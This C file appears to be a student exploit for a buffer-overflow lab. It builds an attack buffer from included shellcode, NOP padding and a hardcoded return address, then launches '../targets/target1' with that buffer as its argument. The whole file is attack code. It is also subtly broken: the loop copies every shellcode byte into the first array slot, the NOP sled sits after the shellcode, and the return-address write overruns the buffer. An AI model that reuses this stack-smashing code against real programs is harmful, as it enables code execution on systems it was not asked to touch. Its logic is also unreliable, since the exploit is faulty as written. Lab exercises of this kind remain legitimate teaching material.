#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 46

#define BUF_SIZE 125
#define BUF_ADDR 0x2021feb0

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUF_SIZE];

	for (int i = 0; i < SHELL_SIZE; i++)
		attack_buffer[0] = shellcode[i];
	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
		attack_buffer[i] = 0x90;
	attack_buffer[BUF_SIZE - 1] = BUF_ADDR;


	int *ret_address = (int*)&attack_buffer[BUF_SIZE - 1];
	*ret_address = BUF_ADDR;

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
